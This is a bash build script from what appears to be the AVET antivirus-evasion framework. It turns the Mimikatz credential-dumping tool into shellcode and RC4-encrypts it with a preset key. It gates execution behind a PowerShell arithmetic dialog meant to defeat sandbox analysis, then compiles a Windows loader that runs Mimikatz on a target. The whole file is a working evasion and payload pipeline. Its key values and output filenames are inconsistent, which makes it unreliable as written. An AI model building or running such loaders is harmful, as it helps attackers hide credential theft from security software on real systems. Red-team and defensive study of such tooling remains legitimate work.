#!/bin/bash

#DESCRIPTION_START
# RC4-encrypt the payload with a static, preset key.
# Here, the mimikatz executable is used as payload, converted into shellcode format by pe_to_shellcode.
# pe_to_shellcode is written by Hasherezade:
# https://github.com/hasherezade/pe_to_shellcode

# This script expects the Mimikatz executable to be at input/mimikatz.exe
# and the pe_to_shellcode executable to reside in a folder parallel to avet: ../pe_to_shellcode/pe2shc.exe
#DESCRIPTION_END

# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh


#CONFIGURATION_START
# enable debug output
enable_debug_print
# generate key file with preset key
generate_key preset aabbccdd1122 input/key_raw.txt
#CONFIGURATION_END

# powershell open MessageBox with text field and ok button
set_command_source static_from_here 'Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing;$window = New-Object System.Windows.Forms.Form;$window.Width = 500;$window.Height = 150;$Label = New-Object System.Windows.Forms.Label;$Label.Location = New-Object System.Drawing.Size(10,10);$Label.Text = '"'"'Rechne aus: 5+5'"'"';$Label.AutoSize = $True;$window.Controls.Add($Label);$windowButton = New-Object System.Windows.Forms.Button;$windowButton.Location = New-Object System.Drawing.Size(10,60);$windowButton.Size = New-Object System.Drawing.Size(50,30);$windowButton.Text = '"'"'OK'"'"';$windowButton.Enabled = $false;$windowTextBox = New-Object System.Windows.Forms.TextBox;$windowTextBox.Location = New-Object System.Drawing.Size(10,30);$windowTextBox.Size = New-Object System.Drawing.Size(350,350);$windowTextBox.add_TextChanged({$windowButton.Enabled = $windowTextBox.Text});$window.Controls.Add($windowTextBox);$windowButton.Add_Click({$calc = [int]$windowTextBox.Text;if($calc -eq 10) {$r = 0;}else {$r = -1;}$window.Dispose();});$window.Controls.Add($windowButton);[void]$window.ShowDialog(); return $r;'
set_command_exec exec_via_powershell

# convert mimikatz executable into shellcode format
# Can be of course used with other .exe files
wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/sc_raw.txt
# encrypt payload
encode_payload rc4 input/sc_raw.txt input/sc_enc_raw.txt input/key_raw.txt

# convert encoded, raw payload into c format for static include
./tools/data_raw_to_c/data_raw_to_c input/sc_enc_raw.txt input/sc_enc_c.txt buf

# set payload source
set_payload_source static_from_file input/sc_enc_c.txt

# set decoder
set_decoder rc4

# convert key to c format and include statically
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key
set_key_source static_from_file input/key_c.txt

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode64


# compile to exe file
$win64_compiler -o output/rc4_interactive_with_arithmetic_pwsh_mimikatz_win64.exe source/avet.c
strip output/rc4enc_mimikatz_win64.exe

# cleanup
cleanup_techniques


echo "
# The decryption key is aabbccddee if it has not been changed.
# You need to provide the decryption key as 2nd command line argument.
# Call generated executable on target like:
# $ rc4enc_mimikatz_win64.exe [your mimikatz arguments, probably 'coffee']  [decryption key]
"
